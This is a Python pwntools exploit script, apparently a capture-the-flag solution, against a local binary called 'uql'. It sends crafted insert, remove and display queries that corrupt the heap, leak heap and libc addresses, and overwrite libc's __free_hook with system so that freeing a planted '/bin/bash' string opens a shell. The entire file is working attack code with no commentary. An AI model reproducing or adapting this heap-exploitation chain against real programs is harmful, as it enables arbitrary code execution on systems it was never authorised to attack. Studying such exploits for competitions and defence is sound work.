from pwn import *

p = process("./uql")
# p = remote("localhost", 1337)
libc = ELF("/usr/lib/libc-2.33.so")
gdb.attach(p)
p.sendlineafter("> ", f"insert A insert {'B'*0x20} remove {'B'*0x20}")
p.sendlineafter("> ", "remove A display everything")
heap = u64(p.recv(8)) - 0x13570
print(hex(heap))
p.sendlineafter("> ", b"insert "+(b"/bin/bash&&"+b"A"*78+p64(heap)+p64(0x21000)+p64(0x21000)+p64(0)).ljust(0x88, b"A")+b" insert B")
p.sendlineafter("> ", f"insert {'D'*0x300} remove {'D'*0x300} display everything")
dump = p.recvuntil("\nInvalid query")[:-len("\nInvalid query")]
leak = u64(dump[dump.index(b'\x7f\x00\x00\x90')-5:dump.index(b'\x7f\x00\x00\x90')+3]) - 0x1c2090
print(hex(leak))
write = (b'E'*297+p64(leak+libc.symbols['__free_hook'])+p64(8)+p64(8)+p64(0)).ljust(0x300, b'E')
p.sendlineafter("> ", b"insert "+write+b" remove "+write)
p.sendlineafter("> ", b"insert C insert D insert E")
p.sendlineafter("> ", b"remove E "+(b" ".join(b"modify \x00\x00\x00\x00\x00\x00\x00\x00 to be "+bytes([c])+b" at "+str(i).encode() for i, c in enumerate(p64(leak+libc.symbols['system']+4)))))
p.interactive()
